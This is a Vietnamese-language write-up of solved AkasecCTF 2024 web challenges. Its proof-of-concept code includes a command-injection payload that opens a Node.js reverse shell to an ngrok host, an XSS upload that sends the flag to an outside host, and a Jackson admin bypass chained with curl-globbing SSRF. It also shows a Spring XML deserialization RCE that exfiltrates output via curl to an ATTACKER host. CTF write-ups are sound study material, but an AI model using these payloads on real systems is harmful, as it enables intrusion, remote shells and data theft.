---
title: "AkasecCTF web chall ctf 2024 - solved challenges"
excerpt: "Jun 13, 2024 08:00 AM ICT to Jun 13, 2024 04:00 PM ICT"
header:
show_date: true
header:
  teaser: "../assets/images/images-icon/akasec.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/akasec.png">
</p>


## Hacker Community
![image](https://hackmd.io/_uploads/HkRTtSDrA.png)



![image](https://hackmd.io/_uploads/BJUqpxXr0.png)

Flag: ``AKASEC{__W3lc0me_t0_HackerC0mmun1tyy__}``


## Rusty Road

![image](https://hackmd.io/_uploads/B1OEFSPH0.png)


poc:

```
# import requests
#
# register_url = "http://172.206.89.197:9080/register"
# login_url = "http://172.206.89.197:9080/login"
# alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&*()_+-=,./<>?:"
# username = "lamdepchaiii"
# PASSWORD = "M07H4F7H38167Hr33175JU57816M3"
# index = 71
# loop = 1
#
# while True:
#     data_reg = {
#         "username": username + "a" * loop,
#         "password": "a" * index + "PASSWORD"
#     }
#
#     register_response = requests.post(register_url, data=data_reg)
#     if "Hello" in register_response.text:
#         print("Đăng ký thành công.")
#     else:
#         print(f"Đăng ký thất bại với mã trạng thái: {register_response.status_code}")
#
#     for char in alphabet:
#         data_log = {
#             "username": username + "a" * loop,
#             "password": "a" * index + PASSWORD + char
#         }
#         login_response = requests.post(login_url, data=data_log)
#
#         if "Hello" in login_response.text:
#             print("Đăng nhập thành công!")
#             PASSWORD += char
#             print(PASSWORD)
#             index -= 1
#             loop += 1
#             break

import requests
import json

log_url = "http://172.206.89.197:9080/log"

log_data = {"message": "&& echo '(function(){var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(16682, \"0.tcp.ap.ngrok.io\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();' > rev.js | bun run rev.js"}

headers = {
    "Cookie": "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl90eXBlIjoiYWRtaW4iLCJleHAiOjEwMDAwMDAwMDAwfQ.MG6gg_c7eZ-aMS2cIs-SasS8w9Ixvkzi2v_-fS7KfOo",
    "Content-Type": "application/json"
}

response = requests.post(log_url, headers=headers, data= json.dumps(log_data))

print(response.text)

```

![image](https://hackmd.io/_uploads/SkkgV2ErA.png)

![image](https://hackmd.io/_uploads/BJlyNn4HR.png)

![image](https://hackmd.io/_uploads/HyMWU3EH0.png)

![image](https://hackmd.io/_uploads/rkCm_nNS0.png)



```
POST /log HTTP/1.1
Host: 172.206.89.197:9080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl90eXBlIjoiYWRtaW4iLCJleHAiOjEwMDAwMDAwMDAwfQ.MG6gg_c7eZ-aMS2cIs-SasS8w9Ixvkzi2v_-fS7KfOo
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Priority: u=1

{"message":
  { "raw":"l3mnt2010 && echo KGZ1bmN0aW9uKCl7CiAgICB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksCiAgICAgICAgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksCiAgICAgICAgc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIsIFtdKTsKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgY2xpZW50LmNvbm5lY3QoMTYwODQsICIwLnRjcC5hcC5uZ3Jvay5pbyIsIGZ1bmN0aW9uKCl7CiAgICAgICAgY2xpZW50LnBpcGUoc2guc3RkaW4pOwogICAgICAgIHNoLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICAgICAgc2guc3RkZXJyLnBpcGUoY2xpZW50KTsKICAgIH0pOwogICAgcmV0dXJuIC9hLzsKfSkoKTs= | base64 -d | bun run -"
  }
}
```

![image](https://hackmd.io/_uploads/rJC7LrDH0.png)


Flag : `AKASEC{w311_17_41n7_7h47_2u57yyy_4f732_411}`


## Upload

![image](https://hackmd.io/_uploads/B1LlcBwHR.png)

- Khi vào views nó sẽ không mở file của nó luôn mà phải truy cập vào uploads/your-file.html để kích hoạt html

![image](https://hackmd.io/_uploads/r1xQrsBB0.png)

```
POST /upload HTTP/1.1
Host: 172.206.89.197:9000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------140731221425871396061686687964
Content-Length: 354
Origin: http://172.206.89.197:9000
Connection: close
Referer: http://172.206.89.197:9000/upload
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl90eXBlIjoiYWRtaW4iLCJleHAiOjEwMDAwMDAwMDAwfQ.MG6gg_c7eZ-aMS2cIs-SasS8w9Ixvkzi2v_-fS7KfOo; connect.sid=s%3A6uYUS3A21Lg0Xyq2MJICGe8I6_5nI7Vk.ZJeBUta0K%2FT9OMLM6QcpaC%2BVngOX2napDlFnrKxU43Q
Upgrade-Insecure-Requests: 1
Priority: u=1

-----------------------------140731221425871396061686687964
Content-Disposition: form-data; name="file"; filename="p.html"
Content-Type: application/pdf

<script>fetch('/flag').then(e=>e.text()).then(e=>{fetch('http://wuzz9syo.requestrepo.com', { method : 'post', body: e })})</script>
-----------------------------140731221425871396061686687964--

```
Flag : `AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3_r0t4t333d_loooool}`

- solution intended của chall này là CVE của file pdf từ việc chúng ta có thể khai thác XSS thông qua file pdf.

## Hacker NickName

- Một chall white-box với java spring + Anotation Jackson + curl global + deserialize java
- Bày này mình đã detect được các chain và dẫn đến deserialize nhưng mà khả năng bypass còn kém nên vẫn phải nhờ đến sự trợ giúp của các anh.


- Chall này là chain của 3 lỗ hổng là jackson anotation bypass admin + curl global to bypass java.net.URL check host + check protocol + check port + CVE deserialize của java hướng đến RCE đọc /readflag

- Trang web có chức năng đơn gian là nhập têm và sở thích sau đó thì hiển thị hacker nickname

![image](https://hackmd.io/_uploads/S12S4UDHA.png)

![image](https://hackmd.io/_uploads/S1o8NUwSA.png)


- Vì là source white-box java nên mình sẽ đi vào phân tích luôn nhé.

- Đầu tiên sẽ tìm những nơi có thể RCE được flag bởi vì để đọc flag cần phải gọi /readflag, sau một hồi lật lại giữa các route thì mình thấy một chain có khả năng dính deserialize của java:

```
@RequestMapping("/ExperimentalSerializer")
public class ExperimentalSerializerController {

    @GetMapping
    public String experimentalSerializer(@RequestParam(value = "serialized", required = false) String serialized, HttpServletRequest request, Model model) {
        if (!request.getRemoteAddr().equals("127.0.0.1"))
            return "redirect:/";
        if (serialized != null)
        {
            HashMap<String, Object> result = ExperimentalSerializer.deserialize(serialized);
            model.addAttribute("result", result.toString());
        }
        return "serializer";
    }
}
```

- Nó sẽ nhận một parameter serialized sau đó check nếu mà người dùng from 127.0.0.1 tức là localhost thì sẽ gọi đến method `deserialize` của `ExperimentalSerializer`
- Và anh null001 đã tìm ra được CVE của nó là `CVE-2017-17485` mình sẽ phân tích nó sau.
- Bây giờ thì đã tìm được nơi chứa vul rồi, tiếp theo tìm hook để access đến nó mình tiếp tục tìm được một route khả nghi sẽ gọi curl rất thuận lợi để bypass localhost:

```
@PostMapping("/update")
    public ResponseEntity<String> post(@RequestParam("url") String url, HttpServletRequest request) throws NullPointerException, IOException, InterruptedException {
        if (!isAdmin(request.getCookies()))
            return ResponseEntity.status(401).body("You are not an admin.");
        URL parsedUrl;
        try {
            parsedUrl = new URL(url);
        } catch (MalformedURLException e) {
            return ResponseEntity.status(401).body(e.getMessage());
        }
        if (!parsedUrl.getProtocol().equals("http") || !parsedUrl.getHost().equals("nicknameservice") || parsedUrl.getPort() != 5000)
            return ResponseEntity.status(401).body("Invalid URL");
        ProcessBuilder pb = new ProcessBuilder("curl", "-f", url, "-o", nicknameService.filePath.toString());
        Process p = pb.start();
        p.waitFor();
        //System.out.println(new String(p.getErrorStream().readAllBytes(), StandardCharsets.UTF_8));
        nicknameService.reload();
        return ResponseEntity.ok("updated.");
    }
```

- Nhưng vấn đề cần giải quyết thứ nhất ở đây là server sẽ check role admin của mình trước khi có thể thực hiện curl.
- Vậy tên ta sẽ quay trở lại flow chính của chương trình đó chính là nhập tên và chọn favorite sau đó hiển thị hacker nickname:

```
 @PostMapping(consumes="application/json")
    public void post(@RequestBody @Valid Hacker hacker, HttpServletResponse response) {
        hacker.setNickName(nicknameService.getNickName());
        String token = jwtUtil.generateToken(hacker.getInfo());
        Cookie cookie = new Cookie("jwt", token);
        cookie.setHttpOnly(true);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
```
- Đây là /route thực hiện điều đó sau đó ta có thể thấy nó generate jwt mới với thông tin của hacker theo class:

```
public class Hacker {
    @NotBlank
    private final String firstName;
    @NotBlank
    private final String lastName;
    @NotBlank
    private final String favouriteCategory;
    private final UserRole role;
    private String nickName;

    @JsonCreator
    public Hacker(@JsonProperty(value = "firstName", required = true) String firstName,
                  @JsonProperty(value = "lastName", required = true) String lastName,
                  @JsonProperty(value = "favouriteCategory", required = true) String favouriteCategory,
                  @JacksonInject UserRole hackerRole) {
        this.firstName = firstName;
        this.lastName = lastName;
        this.favouriteCategory = favouriteCategory;
        this.role = hackerRole;
    }

    public Boolean isAdmin() {
        return (role.admin);
    }

    public void setNickName(String nickName) {
        this.nickName = nickName;
    }

    public Map<String, Object> getInfo() {
        Map<String, Object> hackerInfo = new HashMap<>();
        hackerInfo.put("nickname", nickName);
        hackerInfo.put("admin", isAdmin());
        return hackerInfo;
    }
}

```
- Có thể thấy `@JacksonInject` sẽ control hackerRole của chúng ta sau đó nó set role mặc định là false tức là không phải admin -> chúng ta sẽ bypass admin bằng cách sử dụng lỗ hổng của `Jackson` anotation, và đây là cách bypass nó:
```
{"firstName":"123","lastName":"123","favouriteCategory":"123",
"":{"admin":true}
}
```

- Tiếp theo quay trở lại với `/update` nó sẽ nhận giá trị url và áp vào class URL của java.net.URL -> check :

```
 if (!parsedUrl.getProtocol().equals("http") || !parsedUrl.getHost().equals("nicknameservice") || parsedUrl.getPort() != 5000)
            return ResponseEntity.status(401).body("Invalid URL");
```

- Nếu protocol khác http host khác `nicknameservice` và port khác `5000` ngay lúc này mình nghĩ đến việc bypass bằng ``@`` nhưng mà nó chỉ hiện thực với python còn java này ta sẽ sử dụng tính năng globbing curl của curl:
- Có một vài các cách curl nhiều domain được curl giới thiệu:
![image](https://hackmd.io/_uploads/HyekWDDSR.png)

![image](https://hackmd.io/_uploads/HyfbZvPS0.png)

- Vậy là bypass được waf này với payload : `/admin/update?url=http://{@nicknameservice:5000/,localhost:8090/}ExperimentalSerializer?serialized=`

### Phân tích lỗ hổng CVE-2021-25646 Jackson:

https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/

### Phân tích CVE-2017-17485 java deserialize to RCE
https://www.cnblogs.com/afanti/p/10203282.html

POC : 

```
    1) Set JWT to admin=true.
        - https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
    2) Curl globbing
        - https://everything.curl.dev/cmdline/globbing.html
    3) Class Instantiation
        - https://samuzora.com/posts/rwctf-2024/
```

```
import httpx
from urllib.parse import quote


URL = "http://172.206.89.197:8090/"
#URL = "http://localhost:8090/"
ATTACKER = "https://ATTACKER/pov.xml"
```

```
 pov.xml 
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean class="#{T(java.lang.Runtime).getRuntime().exec(
        new String[] {
        '/bin/bash', '-c', 'curl https://ATTACKER/?flag=$(/readflag|base64)'
        }
        )}"></bean>
</beans>
```

# Set JWT admin true cookie
# Ref: https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/

```
def get_admin_jwt(client):
    payload = {
        "firstName": "marce",
        "lastName": "loves",
        "favouriteCategory": "p4rra",
        "": {"admin": True}
    }
    r = client.post(URL, json=payload)
    print(f"[*] jwt: {r.cookies['jwt']}\n")
    assert "" != r.cookies['jwt']


# /admin update
def deserialization(client):
    build = '[{"type":"object","name":"TypeReference","value":"org.springframework.context.support.FileSystemXmlApplicationContext|' + ATTACKER + '"}]'
    payload = {'url': "http://{127.0.0.1:8090,@nicknameservice:5000/}/ExperimentalSerializer?serialized="+quote(build)}
    r = client.post(URL+'admin/update', data=payload)
    print(r.text)


client = httpx.Client()
get_admin_jwt(client)
deserialization(client)
```

link : https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
link curl global : https://curl.se/docs/manpage.html
link cve : https://www.cnblogs.com/afanti/p/10203282.html

## Proxy for life
![image](https://hackmd.io/_uploads/B1x3KBwBA.png)


- Chall white-box with go server

poc :

```
const express = require('express')
const app = express()
const port = 3000

let switchFlag = 0;

app.get('/', (req, res) => {
    if (switchFlag == 0) {
        res.send('Hello World!');
        switchFlag = 1;
    } else {
        res.redirect('http://localhost:1337/debug/pprof/cmdline');
        switchFlag = 0;
    }
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
```

- document for result : https://pkg.go.dev/net/http/pprof

flag : `AKASEC{r0t4t3d_p20x1n9_f002_11f3_15n7_92347_4f732_411____}`


## Misc/Pyjail

https://capitalizemytitle.com/gothic-font-generator/

![image](https://hackmd.io/_uploads/B1zpXX8HC.png)